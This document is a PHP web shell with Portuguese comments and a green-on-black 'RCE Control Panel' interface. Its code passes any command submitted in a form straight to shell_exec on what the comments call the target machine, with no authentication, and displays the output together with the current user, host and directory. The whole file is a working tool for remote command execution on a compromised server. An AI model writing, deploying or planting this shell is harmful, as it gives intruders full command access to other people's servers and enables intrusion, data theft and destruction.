<?php

// Pega o diretório atual
$currentDir = getcwd();

// Executa o comando para ver qual é o usuario atual
$user = trim(shell_exec('whoami'));

// Pega o host
$host = gethostname();

// Guarda o comando enviado através do formulário
$cmd = $_POST['cmd'] ?? null;

// Guarda a saída gerada pelo comando
$output = '';

// Verifica se existe comando vindo via post
if ($cmd) {
    // Se sim, vai guardar o comando executado, e usar o shell_exec para executar o comando na marquina alvo.
    $output = shell_exec($cmd . " 2>&1");
}

?>

<!DOCTYPE html>
<html lang="pt_BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>RCE Control Panel</title>

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css" rel="stylesheet">

    <style>
        body {
            background: #020617;
            color: #00ff9c;
            font-family: "Courier New", monospace;
        }

        .panel {
            max-width: 1000px;
            margin: auto;
            margin-top: 50px;
            background: #000;
            border-radius: 10px;
            border: 1px solid #00ff9c;
            box-shadow: 0 0 25px #00ff9c33;
        }

        .panel-header {
            background: #020617;
            padding: 10px 20px;
            border-bottom: 1px solid #00ff9c33;
        }

        .panel-title {
            color: #00ff9c;
            font-weight: bold;
        }

        .system-info {
            font-size: 14px;
            color: #38bdf8;
        }

        .terminal {
            padding: 20px;
        }

        .prompt {
            color: #38bdf8;
        }

        .output {
            margin-top: 15px;
            background: #020617;
            padding: 15px;
            border-radius: 6px;
            white-space: pre-wrap;
            min-height: 200px;
        }

        input {
            background: #000 !important;
            color: #00ff9c !important;
            border: 1px solid #00ff9c !important;
        }

        input:focus {
            box-shadow: 0 0 10px #00ff9c55 !important;
        }

        .btn-run {
            background: #00ff9c;
            color: #000;
            border: none;
        }

        .btn-run:hover {
            background: #00cc7a;
        }

        .cursor {
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0% {
                opacity: 0
            }

            50% {
                opacity: 1
            }

            100% {
                opacity: 0
            }
        }
    </style>

</head>

<body>

    <div class="panel">

        <div class="panel-header">

            <div class="d-flex justify-content-between">

                <div class="panel-title">
                    Remote Command Console
                </div>

                <div class="system-info">
                    <?= $user ?>@<?= $host ?>
                </div>

            </div>

        </div>

        <div class="terminal">

            <div class="mb-2 system-info">
                Diretório atual: <?= htmlspecialchars($currentDir) ?>
            </div>

            <form method="POST">

                <div class="input-group">

                    <span class="input-group-text prompt">
                        <?= $user ?>@<?= $host ?>:$
                    </span>

                    <input
                        type="text"
                        name="cmd"
                        class="form-control"
                        placeholder="Digite um comando..."
                        autocomplete="off"
                        autofocus>

                    <button class="btn btn-run">
                        Run
                    </button>

                </div>

            </form>

            <?php if ($cmd): ?>

                <div class="output">

                    <div class="mb-2">
                        <span class="prompt"><?= $user ?>@<?= $host ?>:$</span>
                        <?= htmlspecialchars($cmd) ?>
                    </div>

                    <?= htmlspecialchars($output ?: "Sem saída") ?>

                    <span class="cursor">█</span>

                </div>

            <?php endif; ?>

        </div>

    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/js/bootstrap.bundle.min.js"></script>

</body>

</html>